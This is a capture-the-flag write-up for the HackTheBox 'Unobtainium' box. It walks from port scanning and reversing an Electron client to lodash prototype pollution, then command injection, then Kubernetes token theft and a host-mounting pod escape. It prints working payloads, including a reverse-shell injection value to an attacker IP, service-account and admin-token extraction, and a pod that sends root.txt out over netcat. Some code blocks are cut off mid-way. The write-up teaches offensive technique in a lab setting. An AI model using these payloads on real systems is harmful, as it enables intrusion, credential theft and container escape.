<h2 id="attack-chain">Attack chain</h2>
<p>Start with the machine's architecture and trust boundaries.</p>
<p>Unobtainium is a <strong>Hard</strong> Linux box. When you see a Hard box on HackTheBox, you should immediately think: <em>"This won't be a simple CVE-to-shell. There will be multiple steps, and I need to chain vulnerabilities."</em></p>
<p>The attack surface here is broad:</p>
<ul>
<li>A website on port 80</li>
<li>A Kubernetes cluster on port 8443</li>
<li>A mysterious Node.js API on port 31337</li>
<li>Multiple download packages (.deb, .rpm, .snap)</li>
</ul>
<p> Don't just look for one vulnerability. Look for the <em>relationships</em> between components. The website offers downloads - those downloads are likely client software that talks to the API. If we can reverse the client, we can discover API endpoints, credentials, and vulnerabilities. Then we can attack the API, get a shell, and from inside the container, pivot to Kubernetes.</p>
<p><strong>Rule of thumb:</strong> When a box gives you software to download, reverse it. It contains secrets.</p>
<hr>
<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
<h3 id="why-recon-first">Why Recon First?</h3>
<p>You cannot attack what you don't understand. Reconnaissance is about building a map of the target. Every open port is a potential entry point. Every service banner is a clue. We need to be thorough because missing a port means missing an attack vector.</p>
<h3 id="step-1-1-quick-port-scan">Step 1.1: Quick Port Scan</h3>
<pre><code class="language-bash" data-language="bash">sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.136.226
</code></pre>
<p><strong>What this does:</strong></p>
<ul>
<li><code>-p-</code> scans all 65,535 TCP ports. Many beginners only scan top 1000 and miss services.</li>
<li><code>--min-rate 10000</code> sends packets fast to avoid timeouts.</li>
<li><code>-oA</code> saves output in multiple formats for later reference.</li>
</ul>
<p> We scan ALL ports because boxes like this often hide services on high ports (like 31337). The port name "Elite" is literally hacker culture - it's a signal.</p>
<p><strong>Results:</strong></p>
<pre><code>PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8443/tcp  open  https-alt
31337/tcp open  Elite
</code></pre>
<h3 id="step-1-2-service-version-detection">Step 1.2: Service Version Detection</h3>
<pre><code class="language-bash" data-language="bash">sudo nmap -p 22,80,8443,31337 -sCV 10.129.136.226
</code></pre>
<p><strong>What this does:</strong></p>
<ul>
<li><code>-sC</code> runs default NSE scripts that can extract banners, detect vulnerabilities, and enumerate services.</li>
<li><code>-sV</code> probes versions so we can research known CVEs.</li>
</ul>
<p><strong>Key findings:</strong></p>
<ul>
<li><strong>Port 80:</strong> Apache httpd 2.4.41 - standard web server.</li>
<li><strong>Port 8443:</strong> Returns Kubernetes JSON responses (<code>"kind":"Status"</code>). This is a <strong>Kubernetes API server</strong>.</li>
<li><strong>Port 31337:</strong> Node.js Express framework with risky methods <code>PUT</code> and <code>DELETE</code>.</li>
</ul>

<ul>
<li>Port 8443 is Kubernetes. Kubernetes means containers. Containers mean potential container escapes.</li>
<li>Port 31337 with PUT/DELETE means a REST API. REST APIs often have broken authorization.</li>
<li>The combination of a web server + Kubernetes + custom API suggests: <em>"There's an application running in containers, and I need to find a way in."</em></li>
</ul>
<h3 id="step-1-3-add-hosts-to-etc-hosts">Step 1.3: Add Hosts to /etc/hosts</h3>
<pre><code class="language-bash" data-language="bash">echo "10.129.136.226 unobtainium.htb" | sudo tee -a /etc/hosts
</code></pre>
<p><strong>Why?</strong> The TLS certificates on port 8443 reference <code>unobtainium</code> and <code>kubernetes.default.svc.cluster.local</code>. The website may also use virtual hosts. Adding the hostname ensures we don't get SSL errors or miss virtual host-specific content.</p>

<h2 id="phase-2-the-electron-app-and-source-recovery">Phase 2: The Electron App &amp; Source Recovery</h2>
<h3 id="reverse-everything-they-give-you">Reverse Everything They Give You</h3>
<p>The website on port 80 advertises a chat application with three download buttons: Debian, RedHat, and Snap. <strong>This is a useful source.</strong> When a target gives you software, they are giving you:</p>
<ol>
<li>The client-side source code (packed, but recoverable)</li>
<li>Hardcoded credentials</li>
<li>API endpoint documentation</li>
<li>The exact protocol the client uses to talk to the server</li>
</ol>
<p><strong>Rule:</strong> reverse client software. Developers embed secrets in clients because they assume users won't look.</p>
<h3 id="step-2-1-download-the-debian-package">Step 2.1: Download the Debian Package</h3>
<pre><code class="language-bash" data-language="bash">wget http://10.129.136.226/downloads/unobtainium_debian.zip -O unobtainium_debian.zip
unzip unobtainium_debian.zip
</code></pre>
<p><strong>Why Debian?</strong>
We're on Kali (Debian-based). The <code>.deb</code> package format is trivial to unpack without installing. We could also analyze <code>.rpm</code> or <code>.snap</code>, but <code>.deb</code> is easiest for us.</p>
<p><strong>Contents:</strong></p>
<pre><code>unobtainium_1.0.0_amd64.deb
unobtainium_1.0.0_amd64.deb.md5sum
</code></pre>
<h3 id="step-2-2-extract-the-deb-package">Step 2.2: Extract the .deb Package</h3>
<p>A <code>.deb</code> package is an <code>ar</code> archive containing three files:</p>
<ul>
<li><code>debian-binary</code> : package format version</li>
<li><code>control.tar.gz</code> : installation scripts and metadata</li>
<li><code>data.tar.xz</code> : the actual files to install</li>
</ul>
<pre><code class="language-bash" data-language="bash">ar x unobtainium_1.0.0_amd64.deb
tar xf data.tar.xz
</code></pre>
<p> We do NOT <code>dpkg -i</code> and install this on our system. That's dangerous and unnecessary. We only need to read the files, not execute them.</p>
<h3 id="step-2-3-find-the-electron-bundle">Step 2.3: Find the Electron Bundle</h3>
<p>Electron apps bundle their JavaScript source into <code>.asar</code> files. Find it:</p>
<pre><code class="language-bash" data-language="bash">find . -name "*.asar"
# Output: ./opt/unobtainium/resources/app.asar
</code></pre>
<p><strong>What is ASAR?</strong>
ASAR (Atom Shell Archive) is a simple tar-like archive format used by Electron. It's not compressed or encrypted - just packed. We can extract it with the <code>asar</code> Node.js tool.</p>
<h3 id="step-2-4-extract-the-source-code">Step 2.4: Extract the Source Code</h3>
<pre><code class="language-bash" data-language="bash"># Install asar globally
sudo npm install -g asar

# Extract the app
asar extract ./opt/unobtainium/resources/app.asar ./app_source
</code></pre>
<p><strong>Result:</strong> Full JavaScript source code of the client application.</p>
<h3 id="step-2-5-analyze-the-client-source">Step 2.5: Analyze the Client Source</h3>
<p>Look at the key files:</p>
<pre><code class="language-bash" data-language="bash">cat ./app_source/src/js/app.js
</code></pre>
<p><strong>Discovery:</strong></p>
<pre><code class="language-javascript" data-language="javascript">data: JSON.stringify({

    "message": {

<p><strong>BINGO.</strong> Hardcoded credentials. The client uses:</p>
<ul>
<li><strong>Username:</strong> <code>felamos</code></li>
<li><strong>Password:</strong> <code>REDACTED</code></li>
<li><strong>Method:</strong> <code>PUT</code> to <code>http://unobtainium.htb:31337/</code></li>
</ul>
<p>Also found in <code>todo.js</code>:</p>
<pre><code class="language-javascript" data-language="javascript">$.ajax({

<p> The client is a <strong>blueprint</strong> of the API. We now know:</p>

<p>Key excerpts from the server code:</p>
<pre><code class="language-javascript" data-language="javascript">const _ = require('lodash');

<li>Use the <strong>Command Injection</strong> in <code>/upload</code> to execute arbitrary commands.</li>
</ol>

<h2 id="phase-4-prototype-pollution-explained">Phase 4: Prototype Pollution Explained</h2>
<h3 id="what-is-prototype-pollution">What is Prototype Pollution?</h3>
<p>JavaScript is a <strong>prototype-based language</strong>. Every object inherits from <code>Object.prototype</code>. If you can modify <code>Object.prototype</code>, you modify ALL objects in the runtime.</p>
<p>The <code>_.merge()</code> function in vulnerable lodash versions copies properties recursively. If you pass a payload like:</p>
<pre><code class="language-json" data-language="json">{
  "__proto__": {
    "canUpload": true
  }
}
</code></pre>
<p><code>_.merge()</code> will follow the <code>__proto__</code> chain and set <code>canUpload: true</code> on <code>Object.prototype</code>. <strong>Every object now has <code>canUpload: true</code>.</strong></p>
<h3 id="why-does-this-work-on-unobtainium">Why Does This Work on Unobtainium?</h3>
<p>Look at the server's <code>PUT /</code> handler:</p>
<pre><code class="language-javascript" data-language="javascript">app.put('/', (req, res) =&gt; {
  const user = findUser(req.body.auth || {});
  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  const message = { icon: '__' };
  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });
  // ...
});
</code></pre>
<p>The <code>req.body.message</code> is attacker-controlled. We inject <code>__proto__: {canUpload: true}</code> into it. <code>_.merge()</code> pollutes the global prototype.</p>
<p>Later, when the <code>/upload</code> endpoint checks:</p>
<pre><code class="language-javascript" data-language="javascript">if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
}
</code></pre>
<p>The <code>user</code> object (which didn't have <code>canUpload</code> before) now inherits it from the polluted prototype. <strong>Access granted.</strong></p>
<p><strong>Important caveat:</strong> The pollution only affects the Node.js process instance that handled our <code>PUT</code> request. If there are multiple backend instances (pods), we need to hit the same one with our <code>/upload</code> request. This is why we chain the requests quickly.</p>

<h2 id="phase-5-command-injection-explained">Phase 5: Command Injection Explained</h2>
<h3 id="the-vulnerable-code">The Vulnerable Code</h3>
<pre><code class="language-javascript" data-language="javascript">app.post('/upload', (req, res) =&gt; {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
  root.upload("./", filename, true);
  res.send({ok: true, Uploaded_File: filename});
});
</code></pre>
<h3 id="what-s-google-cloudstorage-commands">What's <code>google-cloudstorage-commands</code>?</h3>
<p>This deprecated npm package has an <code>upload</code> function:</p>
<pre><code class="language-javascript" data-language="javascript">function upload(inputDirectory, bucket, force = false) {
    let _path = path.resolve(inputDirectory)
    let _rn = force ? '-r' : '-Rn'
    let _cmd = exec(`gsutil -m cp ${_rn} -a public-read ${_path} ${bucket}`)
    // ...
}
</code></pre>
<p><strong>The vulnerability:</strong> <code>bucket</code> (which is our <code>filename</code>) is passed directly into a shell command via <code>exec()</code>. No sanitization. No escaping.</p>
<p>If we send:</p>
<pre><code class="language-json" data-language="json">{"filename": "x; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'"}
</code></pre>
<p>The executed command becomes:</p>
<pre><code class="language-bash" data-language="bash">gsutil -m cp -r -a public-read ./ x; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'
</code></pre>
<p>The semicolon (<code>;</code>) terminates the <code>gsutil</code> command and starts our reverse shell.</p>
<hr>
<h2 id="phase-6-initial-foothold-user-flag">Phase 6: Initial Foothold (User Flag)</h2>
<h3 id="step-6-1-start-a-listener">Step 6.1: Start a Listener</h3>
<pre><code class="language-bash" data-language="bash">nc -lnvp 443
</code></pre>
<h3 id="step-6-2-chain-the-exploit">Step 6.2: Chain the Exploit</h3>
<p>We need to execute the prototype pollution and command injection <strong>quickly</strong> and <strong>on the same backend instance</strong>:</p>
<pre><code class="language-bash" data-language="bash">curl -s -X PUT http://10.129.136.226:31337/ \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "REDACTED"}, "message": {"test": "x", "__proto__": {"canUpload": true}}}' \
&amp;&amp; curl -s -X POST http://10.129.136.226:31337/upload \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "REDACTED"}, "filename": "x; bash -c \"bash &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1\""}'
</code></pre>
<p><strong>Why chain with <code>&amp;&amp;</code>?</strong> The prototype pollution effect is ephemeral. It only lasts for that Node.js process instance and can reset quickly. By chaining with <code>&amp;&amp;</code>, the second request fires immediately after the first completes.</p>
<p><strong>If it fails</strong> (<code>Access denied</code>), the <code>/upload</code> hit a different backend pod. Just retry.</p>
<h3 id="step-6-3-stabilize-the-shell">Step 6.3: Stabilize the Shell</h3>
<pre><code class="language-bash" data-language="bash">python3 -c 'import pty;pty.spawn("bash")'
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
</code></pre>
<h3 id="step-6-4-grab-the-user-flag">Step 6.4: Grab the User Flag</h3>
<pre><code class="language-bash" data-language="bash">cat /root/user.txt
# 184995[redacted]f33e33a6
</code></pre>
<p><strong>We're root... inside a container.</strong> <code>hostname</code> shows something like <code>webapp-deployment-9546bc7cb-6r7sq</code>. This is a Kubernetes pod name.</p>
<hr>
<h2 id="phase-7-kubernetes-enumeration">Phase 7: Kubernetes Enumeration</h2>
<h3 id="i-m-in-a-container-now-what">"I'm in a Container: Now What?"</h3>
<p>When you get a shell and you're root but it doesn't feel like a real host, you're in a container. Containers have limited access to the host, but they often have <strong>service account tokens</strong> for the orchestrator (Kubernetes).</p>
<p><strong>Rule:</strong> Check <code>/run/secrets/kubernetes.io/serviceaccount/</code> in containers.</p>
<h3 id="step-7-1-find-the-service-account-token">Step 7.1: Find the Service Account Token</h3>
<pre><code class="language-bash" data-language="bash">ls -la /run/secrets/kubernetes.io/serviceaccount/
cat /run/secrets/kubernetes.io/serviceaccount/namespace
# default
cat /run/secrets/kubernetes.io/serviceaccount/token
</code></pre>
<p><strong>This JWT token is our key to the Kubernetes API.</strong></p>
<h3 id="step-7-2-test-api-access">Step 7.2: Test API Access</h3>
<pre><code class="language-bash" data-language="bash">APISERVER=https://10.129.136.226:8443
SERVICEACCOUNT=/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat ${SERVICEACCOUNT}/token)
CACERT=${SERVICEACCOUNT}/ca.crt

curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api
</code></pre>
<p><strong>Why the external IP?</strong> The internal cluster IP (<code>10.96.0.1</code>) timed out from our pod. But the Kubernetes API is also exposed externally on port 8443. The service account token works against both.</p>
<h3 id="step-7-3-enumerate-namespaces-and-pods">Step 7.3: Enumerate Namespaces and Pods</h3>
<pre><code class="language-bash" data-language="bash"># List namespaces
curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces

# List pods in dev namespace
curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/dev/pods
</code></pre>
<p><strong>Key discovery:</strong> The <code>dev</code> namespace contains 3 pods:</p>
<ul>
<li><code>devnode-deployment-776dbcf7d6-g4659</code> @ <code>10.42.0.64</code></li>
<li><code>devnode-deployment-776dbcf7d6-7gjgf</code> @ <code>10.42.0.70</code></li>
<li><code>devnode-deployment-776dbcf7d6-sr6vj</code> @ <code>10.42.0.62</code></li>
</ul>
<p>All running <code>localhost:5000/node_server</code> on port <strong>3000</strong>.</p>
<p> The dev pods run the SAME <code>node_server</code> image as the webapp we just exploited. The developer reused the same vulnerable code in the dev environment. This is extremely common in real life - dev/staging/prod code parity means vulnerabilities often propagate across environments.</p>
<hr>
<h2 id="phase-8-lateral-movement-to-dev-container">Phase 8: Lateral Movement to Dev Container</h2>
<h3 id="the-strategy">The Strategy</h3>
<p>We have network access to the dev pods from our webapp container (same cluster network). The dev pods run the same Node.js app on port 3000. We will <strong>re-use the exact same exploit</strong> against an internal IP.</p>
<h3 id="step-8-1-start-another-listener">Step 8.1: Start Another Listener</h3>
<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<h3 id="step-8-2-exploit-the-internal-dev-pod">Step 8.2: Exploit the Internal Dev Pod</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X PUT http://10.42.0.64:3000/ \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "REDACTED"}, "message": {"test": "x", "__proto__": {"canUpload": true}}}' \
&amp;&amp; curl -s -X POST http://10.42.0.64:3000/upload \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "REDACTED"}, "filename": "x; bash -c \"bash &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1\""}'
</code></pre>
<p><strong>Result:</strong> Shell as <code>root</code> in <code>devnode-deployment-776dbcf7d6-g4659</code>.</p>
<p><strong>Why did this work again?</strong> Same application, same vulnerabilities, no patch. Internal services are often less monitored and patched than public-facing ones.</p>
<hr>
<h2 id="phase-9-privilege-escalation-via-kubernetes">Phase 9: Privilege Escalation via Kubernetes</h2>
<h3 id="different-container-different-permissions">"Different Container, Different Permissions"</h3>
<p>Each pod has its own service account token with different Kubernetes RBAC permissions. The webapp container's token was limited. The dev container's token might have more access.</p>
<p><strong>Rule:</strong> re-enumerate Kubernetes permissions from every new container.</p>
<h3 id="step-9-1-check-permissions-from-dev-container">Step 9.1: Check Permissions from Dev Container</h3>
<pre><code class="language-bash" data-language="bash">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Can we list secrets in kube-system?
curl -k --header "Authorization: Bearer ${TOKEN}" \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/secrets
</code></pre>
<p><strong>BREAKTHROUGH:</strong> We can list secrets in <code>kube-system</code>! Among them is <code>c-admin-token-b47f7</code>.</p>
<h3 id="step-9-2-extract-the-admin-token">Step 9.2: Extract the Admin Token</h3>
<pre><code class="language-bash" data-language="bash">ADMIN_TOKEN=$(curl -k --header "Authorization: Bearer ${TOKEN}" \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/secrets/c-admin-token-b47f7 \
  | grep -o '"token": "[^"]*"' | cut -d'"' -f4 | base64 -d)
</code></pre>
<p><strong>Why base64 decode?</strong> Kubernetes stores secret values base64-encoded in the API response.</p>
<h3 id="step-9-3-verify-admin-access">Step 9.3: Verify Admin Access</h3>
<pre><code class="language-bash" data-language="bash">curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/pods
</code></pre>
<p><strong>Result:</strong> Full pod listing. This token has <strong>cluster-admin</strong> privileges.</p>
<hr>
<h2 id="phase-10-root-flag">Phase 10: Root Flag</h2>
<h3 id="the-strategy-2">The Strategy</h3>
<p>With cluster-admin access, we can create a <strong>privileged pod</strong> that mounts the host's root filesystem (<code>/</code>). This is the standard Kubernetes container escape technique.</p>
<h3 id="step-10-1-start-a-listener-for-the-flag">Step 10.1: Start a Listener for the Flag</h3>
<pre><code class="language-bash" data-language="bash">nc -lnvp 5555
</code></pre>
<h3 id="step-10-2-create-the-malicious-pod">Step 10.2: Create the Malicious Pod</h3>
<p>We POST a Pod spec directly to the Kubernetes API:</p>
<pre><code class="language-bash" data-language="bash">curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" \
  -H "Content-Type: application/json" \
  -X POST \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
      "name": "root-exfil"
    },
    "spec": {
      "containers": [
        {
          "name": "evil",
          "image": "localhost:5000/dev-alpine",
          "command": ["/bin/sh"],
          "args": ["-c", "cat /mnt/root/root.txt | nc 10.10.16.84 5555"],
          "volumeMounts": [
            {
              "name": "hostfs",
              "mountPath": "/mnt"
            }
          ]
        }
      ],
      "volumes": [
        {
          "name": "hostfs",
          "hostPath": {
            "path": "/"
          }
        }
      ]
    }
  }'
</code></pre>
<p><strong>Why <code>localhost:5000/dev-alpine</code>?</strong></p>
<ul>
<li>The cluster has no internet access (can't pull from Docker Hub).</li>
<li>We need an image that already exists on the node.</li>
<li>The existing <code>backup-pod</code> uses this exact image, confirming it's available locally.</li>
</ul>
<p><strong>What this pod does:</strong></p>
<ul>
<li>Creates a container using a local Alpine image</li>
<li>Mounts the host filesystem <code>/</code> to <code>/mnt</code> inside the container</li>
<li>Runs <code>cat /mnt/root/root.txt</code> and pipes it to our netcat listener</li>
</ul>
<h3 id="step-10-3-catch-the-flag">Step 10.3: Catch the Flag</h3>
<p>On our listener:</p>
<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.136.226] 43122
d1a073[redacted]bc323f9f17
</code></pre>
<p><strong>Root flag:</strong> <code>d1a073a[redacted]323f9f17</code></p>
<hr>
<h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
<h3 id="1-reverse-client-software">1. Reverse Client Software</h3>
<p>When a target gives you binaries/packages, reverse them. They contain API specs, credentials, and architecture details that save hours of blind fuzzing.</p>
<h3 id="2-prototype-pollution-is-powerful">2. Prototype Pollution is Powerful</h3>
<p>Modern JavaScript apps using <code>_.merge()</code>, <code>_.defaultsDeep()</code>, or similar functions on user input are vulnerable. If you see <code>lodash</code> &lt; 4.17.12, investigate prototype pollution immediately.</p>
<h3 id="3-chain-low-to-high">3. Chain Low to High</h3>
<ul>
<li>LFI → Read server source</li>
<li>Source review → Find vulnerable libraries</li>
<li>Prototype pollution → Escalate privileges</li>
<li>Command injection → Get shell</li>
</ul>
<h3 id="4-kubernetes-new-attack-surface">4. Kubernetes = New Attack Surface</h3>
<p>Inside a container? Look for:</p>
<ul>
<li><code>/run/secrets/kubernetes.io/serviceaccount/token</code></li>
<li>Service account permissions vary by pod/namespace</li>
<li>One pod's token might be limited; another's might be powerful</li>
<li>With cluster-admin: create privileged pods to mount host filesystem</li>
</ul>
<h3 id="5-reuse-exploits-internally">5. Reuse Exploits Internally</h3>
<p>Dev/staging/prod environments often share vulnerabilities. If you exploit one service, test the same exploit against internal instances.</p>
<h3 id="6-local-images-for-malicious-pods">6. Local Images for Malicious Pods</h3>
<p>When creating Kubernetes pods for escape, use images already cached on the node (<code>kubectl get pods -o yaml | grep image:</code>). The target likely has no outbound internet.</p>
